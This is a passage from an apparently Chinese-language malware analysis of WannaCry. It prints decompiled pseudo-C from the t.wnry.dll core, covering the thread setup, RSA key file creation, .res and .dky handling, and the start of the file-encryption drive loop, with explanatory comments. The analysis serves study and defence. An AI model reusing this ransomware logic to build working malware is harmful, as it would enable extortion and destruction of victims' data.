src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image18.png" class="" width="18"><p>图十六：t_wnry.dll 导出表</p><p>得知TaskStart就是传进去的第二个参数</p><h2 id="5-4-小结"><a href="#5-4-小结" class="headerlink" title="5.4 小结"></a>5.4 小结</h2><ol><li><p> 获取必要的API函数地址</p></li><li><p> 导入私钥并申请空间</p></li><li><p> 用导入的私钥解密出一个dll</p></li><li><p> 申请一块堆空间 将dll写入到堆内存里</p></li><li><p> 在堆内存中找到dll的导出函数地址 并调用</p></li></ol><p>从上面的分析可以得出病毒的主体程序实际上只做了一些初始化的操作<br>到目前为止并没有看到它感染或加密任何一个文件 也没有对用户进行勒索<br>真正的核心代码在t.wnry中 由于这个函数是在堆空间中调用<br>所以在IDA中并没有显示出伪C代码 那么接下来需要分析刚刚提取出来的dll</p><h2 id="5-5-加载病毒核心操作"><a href="#5-5-加载病毒核心操作" class="headerlink" title="5.5 加载病毒核心操作"></a>5.5 加载病毒核心操作</h2><p>在这部分所涉及的函数的操作都只有一个目的，即利用dll文件中的导出函数，下面我们分步进行分析</p><h3 id="5-3-1-GetApis-获取必要的API函数-1"><a href="#5-3-1-GetApis-获取必要的API函数-1" class="headerlink" title="5.3.1 GetApis 获取必要的API函数"></a>5.3.1 GetApis 获取必要的API函数</h3><h1 id="6-t-wnry-dll-病毒核心部分分析"><a href="#6-t-wnry-dll-病毒核心部分分析" class="headerlink" title="6 t.wnry.dll 病毒核心部分分析"></a>6 t.wnry.dll 病毒核心部分分析</h1><h2 id="6-1-主体逻辑"><a href="#6-1-主体逻辑" class="headerlink" title="6.1 主体逻辑"></a>6.1 主体逻辑</h2><p>t.wnry.dll<br>作为病毒的核心部分，包括了病毒所有的危害操作，包括加密解密文件，勒索用户等有害操作，下面我将为大家一步步的进行分析：</p><h3 id="6-1-1-TaskStart-病毒的逻辑主体函数"><a href="#6-1-1-TaskStart-病毒的逻辑主体函数" class="headerlink" title="6.1.1 TaskStart 病毒的逻辑主体函数"></a>6.1.1 TaskStart 病毒的逻辑主体函数</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __stdcall <span class="token function">TaskStart</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">||</span> <span class="token function">RunSingle</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                      <span class="token comment">// 互斥体防双开  </span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  Filename <span class="token operator">=</span> word_1000D918<span class="token punctuation">;</span>                     <span class="token comment">// 初始化缓冲区  </span><span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x204u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v13 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">GetModuleFileNameW</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Filename<span class="token punctuation">,</span> <span class="token number">0x103u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取当前进程的完整路径  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">wcsrchr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Filename<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token operator">*</span><span class="token function">wcsrchr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Filename<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token comment">// 获取到字符串->.wcry.exe   </span><span class="token function">SetCurrentDirectoryW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Filename<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">ReadFileToMem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_wnryBase<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>         <span class="token comment">// 读取c.wnry到内存  </span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  StartIsSuccess <span class="token operator">=</span> <span class="token function">GetUsersidAndCmp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 获取当前用户的SID并与系统的SID作比较  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">GetApis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                             <span class="token comment">// 获取必要的API函数地址  </span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span>FileName_0<span class="token punctuation">,</span> a08xRes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// Dest=00000000.res  </span><span class="token function">sprintf</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> a08xPky<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// FileName=00000000.pky  </span><span class="token function">sprintf</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> a08xEky<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// buff=00000000.eky  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">SetAccessControl</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">sub_10004500</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment">// 1.设置访问控制属性 2.判断是否存在00000000.pky这个文件 由于不存在 直接return  </span><span class="token punctuation">&#123;</span>  hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>StartExeAndSetReg<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 条件不成立 跳过这个if分支 隐藏分支待分析  </span><span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  lpAddress <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>operator <span class="token function">new</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 申请一块内存空间  </span>v14 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> lpAddress <span class="token punctuation">)</span>  v3 <span class="token operator">=</span> <span class="token function">InitializeCriSection</span><span class="token punctuation">(</span>lpAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 初始化临界区  </span><span class="token keyword">else</span>v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v14 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v3 <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">CreatePkyAndEky</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> FileName<span class="token punctuation">,</span> buff<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 创建00000000.pky和00000000.eky 一个是公钥 一个是加密后的私钥  </span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">OpenResFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> dword_1000DC70 <span class="token punctuation">)</span> <span class="token comment">// 打开00000000.res文件 </span><span class="token punctuation">&#123;</span>  <span class="token function">DeleteFileA</span><span class="token punctuation">(</span>FileName_0<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>RandomBytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x88u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  dword_1000DC70 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">GetRandom</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HCRYPTPROV<span class="token punctuation">)</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>RandomBytes<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取0x8个字节的随机数  </span><span class="token punctuation">&#125;</span>  <span class="token function">DestoryHandle</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__thiscall <span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//隐藏函数 用于释放临界区  </span>hThread_1 <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>CreateResFile<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 创建00000000.res文件  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> hThread_1 <span class="token punctuation">)</span>  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread_1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  hThread_2 <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>CheckDky<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 每隔五秒检测是否存在774F34B5.dky这个文件 由于文件不存在 直接return  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> hThread_2 <span class="token punctuation">)</span>  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread_2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  hThread_3 <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>EncryptAllFiles<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 加密所有文件  </span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  hThread_4 <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> StartTaskdl<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 每隔三秒以隐藏的方式启动taskdl.exe  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> hThread_4 <span class="token punctuation">)</span>  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread_4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  hThread_5 <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>StartExeAndSetReg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 每隔三秒 启动taskse.exe和@WanaDecryptor@.exe并且修改注册表  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> hThread_5 <span class="token punctuation">)</span>  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread_5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">RepeatOperation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建批处理脚本</span>加密器 Read_Me@<span class="token punctuation">.</span>txt 加密其他用户下的文件 <span class="token keyword">if</span> <span class="token punctuation">(</span> hThread_3 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread_3<span class="token punctuation">,</span> INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread_3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Dll 文件主题包括了病毒的所有操作：</p><ol><li><p> 初始 临界区，缓冲区，路径，字符串并将c.wnry读到内存</p></li><li><p> 建立 公钥，私钥文件，并加密所有文件</p></li><li><p> 每隔三秒 隐藏方式启动 taskdl.exe taskse.exe 等文件</p></li><li><p> 创建批处理脚本 加密器 Read_Me@.txt 加密其他用户下的文件</p></li></ol><h3 id="6-1-2-GetUsersidAndCmp-获取当前用户SID并与系统的SID作比较"><a href="#6-1-2-GetUsersidAndCmp-获取当前用户SID并与系统的SID作比较" class="headerlink" title="6.1.2 GetUsersidAndCmp 获取当前用户SID并与系统的SID作比较"></a>6.1.2 GetUsersidAndCmp 获取当前用户SID并与系统的SID作比较</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x254u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// 将buff缓冲区清零  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">GetCurrentUserSID</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Buffer<span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token comment">// 获取当前用户的SID  </span><span class="token punctuation">&#123;</span>  v0 <span class="token operator">=</span> <span class="token function">wcsicmp</span><span class="token punctuation">(</span>aS1518<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 比较当前的SID是否是S-1-5-18->系统的SID  </span><span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从注册表中获取到当前用户的SID并于系统的SID做比较</p><h3 id="6-1-3-CreatePkyAndEky-创建-pky-和-eky-文件"><a href="#6-1-3-CreatePkyAndEky-创建-pky-和-eky-文件" class="headerlink" title="6.1.3 CreatePkyAndEky 创建 pky 和 eky 文件"></a>6.1.3 CreatePkyAndEky 创建 pky 和 eky 文件</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">GetCSPHandle</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> this<span class="token punctuation">)</span> <span class="token punctuation">)</span>            <span class="token comment">// 获取CSP服务程序句柄  </span><span class="token punctuation">&#123;</span>  <span class="token function">DestoryHandle</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment">// 如果失败则释放资源  </span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> lpFileName <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">ImportPubKey</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> lpFileName<span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token comment">// 当00000000.pky不存在时 条件成立  </span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">CryptImportKey_Addr</span><span class="token punctuation">(</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pbData<span class="token punctuation">,</span> <span class="token number">0x114</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v3 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">// 导入RSA公钥  </span><span class="token operator">||</span> <span class="token operator">!</span><span class="token function">CryptGenKey</span><span class="token punctuation">(</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment">// 生成可导出的2048位RSA签名密钥  </span><span class="token operator">||</span> <span class="token operator">!</span><span class="token function">CreatePkyFile</span><span class="token punctuation">(</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">6u</span><span class="token punctuation">,</span> lpFileName<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 创建00000000.pky文件 并写入生成的RSA公钥  </span><span class="token punctuation">&#123;</span>  <span class="token keyword">goto</span> LABEL_19<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> pky_str <span class="token punctuation">)</span>  <span class="token function">CreateEkyFile</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v3<span class="token punctuation">,</span> pky_str<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 创建00000000.eky文件 并写入加密后的RSA私钥  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">ImportPubKey</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> lpFileName<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token comment">// 导入00000000.pky的公钥  </span><span class="token punctuation">&#123;</span>  BEL_19<span class="token operator">:</span>  <span class="token function">DestoryHandle</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">// 如果导入失败释放句柄  </span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  v5 <span class="token operator">=</span> v3<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                                 <span class="token comment">// 当00000000.pky存在时 直接退出函数  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数在当前路径里创建 pky 和 eky文件， pky为公钥，eky为加密后的私钥</p><h3 id="6-1-4-CreateResFile-线程回调-创建-res-文件"><a href="#6-1-4-CreateResFile-线程回调-创建-res-文件" class="headerlink" title="6.1.4 CreateResFile 线程回调+创建 res 文件"></a>6.1.4 CreateResFile 线程回调+创建 res 文件</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __stdcall __noreturn <span class="token function">CreateResFile</span><span class="token punctuation">(</span>LPVOID lpThreadParameter<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// esi  </span><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_1000DD90 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  SystemTime <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">// 返回当前系统时间  </span><span class="token function">CreateRes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment">// 创建并写入00000000.res文件  </span>index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">do</span>                                         <span class="token comment">// 休眠22秒  </span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_1000DD90 <span class="token punctuation">)</span>  <span class="token keyword">goto</span> LABEL_6<span class="token punctuation">;</span>  <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">1000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">++</span>index<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> index <span class="token operator">&lt;</span> <span class="token number">0x19</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  LABEL_6<span class="token operator">:</span>  <span class="token function">ExitThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment">// 退出线程  </span><span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在当前工作路径创建了 res 文件，并往里写数据：</p><p>写入了 0x8个字节的随机数 和 0x4 个字节的当前时间</p><h3 id="6-1-5-CheckDky-线程回调-检测文件存在与否"><a href="#6-1-5-CheckDky-线程回调-检测文件存在与否" class="headerlink" title="6.1.5 CheckDky 线程回调+检测文件存在与否"></a>6.1.5 CheckDky 线程回调+检测文件存在与否</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __stdcall __noreturn <span class="token function">CheckDky</span><span class="token punctuation">(</span>LPVOID lpThreadParameter<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  dword_1000DD8C <span class="token operator">=</span> <span class="token function">sub_10004500</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>lpThreadParameter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 检测是否存在774F34B5.dky这个文件 由于文件不存在 直接return  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> dword_1000DD8C <span class="token punctuation">)</span>  <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">5000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">ExitThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每隔5秒检测时候存在 dky 文件，存在就 引入 公钥并 进行 加解密操作</p><h2 id="6-2-EncrypteAllFiles-线程回调-加密-Important"><a href="#6-2-EncrypteAllFiles-线程回调-加密-Important" class="headerlink" title="6.2 EncrypteAllFiles 线程回调+加密 (Important)"></a>6.2 EncrypteAllFiles 线程回调+加密 (Important)</h2><blockquote><p>作为病毒的核心函数嵌套了，里外嵌套了很多层</p></blockquote><h3 id="6-2-1-第一层"><a href="#6-2-1-第一层" class="headerlink" title="6.2.1 第一层"></a>6.2.1 第一层</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">Drives <span class="token operator">=</span> <span class="token function">GetLogicalDrives</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">// 获取驱动中所有磁盘  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_1000DD8C <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">3000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  Drives_1 <span class="token operator">=</span> Drives<span class="token punctuation">;</span>  Drives <span class="token operator">=</span> <span class="token function">GetLogicalDrives</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> Drives <span class="token operator">!=</span> Drives_1 <span class="token punctuation">)</span>                 <span class="token comment">// 检测是否有新的磁盘加入  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>循环检测是否有新的磁盘加入，有就加密，没有就一直循环</p><h3 id="6-2-2-第二层"><a href="#6-2-2-第二层" class="headerlink" title="6.2.2 第二层"></a>6.2.2 第二层</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">DWORD __stdcall 